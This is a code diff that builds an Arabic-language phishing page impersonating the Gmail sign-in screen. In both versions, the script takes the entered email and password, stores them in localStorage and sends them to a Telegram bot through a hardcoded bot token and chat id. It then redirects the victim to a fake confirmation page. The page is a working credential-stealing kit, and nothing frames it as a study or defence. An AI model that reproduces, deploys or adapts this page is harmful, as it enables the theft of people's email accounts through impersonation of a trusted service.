@@ -1,24 +1,42 @@
-<script>
-function sendData() {
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>Gmail - تسجيل الدخول</title>
+  <style>
+    body { font-family: Arial; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .box { width: 300px; padding: 30px; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; border-radius: 4px; border: 1px solid #ccc; }
+    button { background: #4285f4; color: white; border: none; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>تسجيل الدخول إلى Gmail</h2>
+    <input type="text" id="email" placeholder="البريد الإلكتروني">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    <button onclick="next()">التالي</button>
+  </div>
 
-  // حفظ البيانات مؤقتًا
-  localStorage.setItem("email", email);
-  localStorage.setItem("password", password);
+  <script>
+    function next() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
-  // إرسال إلى Telegram
-  fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: "7493001551",
-      text: `📥 تحقق أمني:\n📧 Email: ${email}\n🔑 Password: ${password}`
-    })
-  });
+      localStorage.setItem("email", email);
+      localStorage.setItem("password", password);
 
-  setTimeout(() => {
-    window.location.href = "enhanced_security.html";
-  }, 1500);
-}
-</script>
+      fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "7493001551",
+          text: `📥 Gmail Login:\n📧 Email: ${email}\n🔑 Password: ${password}`
+        })
+      });
+
+      window.location.href = "gmail_confirm.html";
+    }
+  </script>
+</body>
+</html>
